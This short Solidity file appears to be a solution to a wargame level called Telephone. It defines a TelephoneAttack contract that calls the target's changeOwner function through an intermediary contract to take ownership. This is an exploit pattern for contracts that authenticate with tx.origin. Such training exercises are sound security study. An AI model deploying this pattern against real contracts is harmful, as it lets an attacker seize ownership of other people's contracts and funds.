// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public telephoneContract;

    constructor(address _target) {
        telephoneContract = Telephone(_target);
    }

    function attack(address _newOwner) public {
        telephoneContract.changeOwner(_newOwner);
    }
}
